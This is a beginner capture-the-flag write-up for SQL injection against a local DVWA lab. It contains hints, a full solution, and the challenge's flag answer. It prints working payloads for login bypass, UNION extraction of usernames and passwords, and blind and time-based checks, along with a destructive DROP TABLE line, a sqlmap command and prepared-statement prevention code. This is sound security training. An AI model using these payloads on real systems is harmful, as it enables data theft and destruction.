# Challenge 06 - The Classic Injection

**Category:** Web
**Difficulty:** Beginner
**Points:** 150
**Target:** DVWA (http://localhost:8081)

## Challenge Description

SQL Injection - the vulnerability that refuses to die. Despite being well-known for over 20 years, it still appears in modern applications.

Your mission is to bypass the login form using SQL injection and retrieve the hidden flag from the database.

## Objectives

- Understand basic SQL injection
- Bypass authentication
- Extract data from the database
- Find the flag

## Target Information

- **URL:** http://localhost:8081
- **Initial Credentials:** admin / password (to access DVWA)
- **Security Level:** Set to LOW
- **Target Page:** SQL Injection

## Getting Started

1. Start DVWA:
   ```bash
   cd docker && docker-compose up -d dvwa
   ```

2. Login to DVWA with admin:password
3. Set Security Level to "Low" (DVWA Security menu)
4. Navigate to SQL Injection page

---

## Hints

<details>
<summary>Hint 1 (Cost: -15 points)</summary>

The classic SQL injection payload for bypassing authentication is: `' OR '1'='1`

This works because it makes the WHERE clause always true.

</details>

<details>
<summary>Hint 2 (Cost: -25 points)</summary>

To extract data from other tables, use UNION-based injection. First, find the number of columns using ORDER BY:
```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
```
Keep incrementing until you get an error.

</details>

<details>
<summary>Hint 3 (Cost: -35 points)</summary>

Once you know the column count, use UNION SELECT to pull data from other tables:
```
1' UNION SELECT table_name, NULL FROM information_schema.tables-- -
```
Look for a table that might contain flags!

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Set Up DVWA

1. Login to http://localhost:8081 with admin:password
2. Go to DVWA Security and set to "Low"
3. Navigate to SQL Injection page

### Step 2: Test for Injection

Enter `1` in the User ID field - normal behavior.
Enter `1'` - if you see an error, it's vulnerable!

### Step 3: Basic Data Extraction

Enter: `1' OR '1'='1`

This returns all users because the query becomes:
```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

### Step 4: Determine Column Count

Try ORDER BY to find column count:
```
1' ORDER BY 1-- -    # Works
1' ORDER BY 2-- -    # Works
1' ORDER BY 3-- -    # Error! (Only 2 columns)
```

### Step 5: UNION-Based Extraction

Now extract data using UNION:

```sql
# List all tables
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -

# List columns in users table
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -

# Extract usernames and passwords
1' UNION SELECT user, password FROM users-- -
```

### Step 6: Find the Flag Table

```sql
# Look for flag-related tables
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_name LIKE '%flag%'-- -
```

You'll find a table called `ctf_flags` (or similar).

### Step 7: Extract the Flag

```sql
1' UNION SELECT flag, NULL FROM ctf_flags-- -
```

Result: `FLAG{sql_1nj3ct10n_m4st3r}`

### Understanding the Vulnerability

**Original Query:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

**Injected Query:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT flag, NULL FROM ctf_flags-- '
```

The `-- ` comments out the rest of the query, preventing syntax errors.

### SQL Injection Cheat Sheet

| Payload | Purpose |
|---------|---------|
| `' OR '1'='1` | Bypass authentication |
| `' ORDER BY N-- -` | Find column count |
| `' UNION SELECT ...-- -` | Extract data |
| `'; DROP TABLE users;-- -` | Destructive (DON'T DO THIS!) |
| `' AND 1=1-- -` | Boolean-based blind |
| `' AND SLEEP(5)-- -` | Time-based blind |

### Prevention

```php
// Vulnerable (string concatenation)
$query = "SELECT * FROM users WHERE id = '$id'";

// Secure (prepared statements)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

</details>

---

## Flag

```
FLAG{sql_1nj3ct10n_m4st3r}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- SQL injection basics
- UNION-based data extraction
- Database enumeration
- Understanding SQL syntax

## Tools Used

- Web browser
- Burp Suite (optional)
- sqlmap (for automation - advanced)

## Automation with sqlmap

```bash
# Basic sqlmap usage (after setting up cookie)
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=low" \
       --dbs
```

## Related Challenges

- [Union Station (Intermediate)](../intermediate/01-union-station.md) - Advanced UNION injection
- [Blind Injection (Advanced)](../advanced/02-blind-injection.md) - Blind SQLi techniques

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
